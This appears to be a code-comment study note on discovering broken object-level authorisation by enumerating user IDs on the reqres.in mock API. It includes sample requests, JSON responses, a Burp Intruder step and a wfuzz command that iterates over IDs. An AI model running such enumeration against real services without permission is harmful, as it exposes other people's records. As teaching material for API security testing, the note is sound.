/*

# Goal 
find the total number of user accounts in reqres.in
https://reqres.in/

# you could use this process to discover a basic BOLA, BFLA vulnerability present

Step 1) Check the documentation 
# found a sample request to GET a user at /api/users/2

GET /api/users/2 200 OK

{
    "data": {
        "id": 2,
        "email": "janet.weaver@reqres.in",
        "first_name": "Janet",
        "last_name": "Weaver",
        "avatar": "https://reqres.in/img/faces/2-image.jpg"
    },
    "support": {
        "url": "https://reqres.in/#support-heading",
        "text": "To keep ReqRes free, contributions towards server costs are appreciated!"
    }
}

# user’s account info by sending a GET request to /api/users/ 
  We can easily assume that user accounts are organized in the user
  directory by their id number

Step 2) Testing the theory using Postman

Method = GET
URL = https://reqres.in/api/users/1
Response:
{
    "data": {
        "id": 1,
        "email": "george.bluth@reqres.in",
        "first_name": "George",
        "last_name": "Bluth",
        "avatar": "https://reqres.in/img/faces/1-image.jpg"
    },
    "support": {
        "url": "https://reqres.in/#support-heading",
        "text": "To keep ReqRes free, contributions towards server costs are appreciated!"
    }
}

Step 3) Use burp intruder to get all users info
# found users 1-12

could be user ID numbers, but they could just as easily be bank account numbers, phone numbers, company names, or email
addresses

Additional step) Could do the same with wfuzz

wfuzz -z range,0-25 -c --hh 404 -u "https://reqres.in/api/users/FUZZ"




*/